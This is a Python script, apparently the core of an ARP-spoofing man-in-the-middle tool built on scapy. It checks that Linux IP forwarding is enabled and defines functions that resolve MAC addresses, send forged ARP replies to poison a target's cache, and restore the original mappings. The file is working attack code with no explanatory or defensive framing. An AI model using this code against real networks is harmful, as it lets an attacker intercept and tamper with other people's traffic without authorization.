#/usr/bin/env python
from scapy.layers.l2 import ARP, Ether
from scapy.all import srp, sendp

def check_port_forwarding():
    # enable port forwarding
    # echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
    # check if port forwarding enabled
    # cat /proc/sys/net/ipv4/ip_forward
    # should print 1
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            value = f.read().strip()
        if value == "1":
            print("[+] Port Forwarding enabled we can proceed.")
        elif value == "0":
            print("[-] Port Forwarding disabled. Please enable.")
            exit()
        else:
            print("[-] Unexpected value " + str(value))
            exit()
    except OSError:
        print(
            "The file /proc/sys/net/ipv4/ip_forward was not found. System may not support IP forwarding or is not Linux.")
    except Exception as e:
        print("An error occurred while trying to connect to IPv4. " + str(e))



def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast / arp_request
    answered_list = srp(broadcast_arp_request, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip, get_mac_address):
    target_mac = get_mac_address(target_ip)
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def restore(destination_ip, source_ip, get_mac_address):
    target_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(packet, count=4, verbose=False)




